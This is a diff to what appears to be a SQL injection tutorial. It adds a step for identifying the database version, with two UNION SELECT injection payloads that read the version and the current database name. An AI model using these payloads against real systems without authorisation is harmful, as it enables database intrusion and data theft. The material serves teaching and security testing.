@@ -146,7 +146,7 @@ When `sqlmap` dumps a table, it is sending thousands of requests to get column n
 - Test for SQL injection vulnerability.
 - Find the number of columns.
 - Confirm injection with time based attack.
-- Identify the database.
+- Identify the database version.
 - List tables.
 - List columns.
 - Dump data.
@@ -207,6 +207,22 @@ or
 | PostgreSQL | pg_sleep |
 | SQL Server | WAITFOR DELAY |
 | Oracle | DBMS_SESSION.SLEEP |
+
+##### Identify the database version
+
+To find the database version, run one of the following commands (it assumed there were two columns being returned so a null was included in the select):
+
+```sql
+' UNION SELECT @@version, NULL --  
+```
+
+or
+
+```sql
+' UNION SELECT database(), NULL --  
+```
+
+
 
 ### SQL Injection Security Measures
 
